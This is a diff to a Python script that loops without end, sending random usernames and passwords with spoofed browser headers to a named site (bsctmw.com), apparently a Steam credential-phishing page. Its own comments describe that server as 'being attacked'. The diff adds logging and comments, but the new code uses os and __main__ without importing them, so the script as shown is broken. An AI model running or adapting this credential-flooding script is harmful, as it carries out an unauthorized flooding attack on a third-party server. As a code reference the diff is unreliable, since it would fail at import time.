@@ -1,14 +1,29 @@
-#!python3
+#!/usr/bin/python3
+
 import requests
 import logging
 import random
 import string
 
+# Path for log file
+log_path = os.path.join(os.path.dirname(os.path.realpath(__main__.__file__)),
+						'{}.log'.format(__name__))
+# Logging config
+logging.basicConfig(level=logging.INFO,
+					filename=log_path,
+					filemode='w',
+					format=('%(asctime)s - %(levelname)s - ' +
+							'%(funcName)s - %(message)s'),
+					datefmt='%d-%m-%y %H:%M:%S')
+logging.getLogger().addHandler(logging.StreamHandler())
+
+# Generates random string
 def randomString(stringLength=10):
 	"""Generate a random string of fixed length """
 	letters = string.ascii_lowercase+string.ascii_uppercase+string.digits
 	return ''.join(random.choice(letters) for i in range(stringLength))
 
+# Connection headers
 headers = {
 	'Host': 'bsctmw.com',
 	'User-Agent': 'Mozilla/5.0 (Windows NT 6.1; rv:60.0) Gecko/20100101 Firefox/60.0',
@@ -21,6 +36,7 @@ headers = {
 	'Connection': 'keep-alive',
 }
 
+# Connection cookies
 cookies = {
 #	'__ddg_': '856806E1D761B35E7BE4173938CABFA9052143F6',
 #	'_csrf': 'tAgle4ZPqH5PysmmkuZtYtDZ',
@@ -46,6 +62,7 @@ while True:
 	username = randomString(random.randrange(12,20,1))
 	password = randomString(random.randrange(12,20,1))
 
+	# Connection parameters
 	params = {
 		'emailauth': '',
 		'emailsteamid': '',
@@ -64,6 +81,8 @@ while True:
 
 	logging.info('Logging in with:\n- user     : {}\n- password : {}'.format(username, password))
 
+	# Sending and receiving connection from server that is being attacked
+	# This is defined as a HTTP responce code
 	response = requests.post('https://bsctmw.com/uncheck2', headers=headers, cookies=cookies, params=params)
 	
 	logging.info('Response from server: {}'.format(response.status_code))
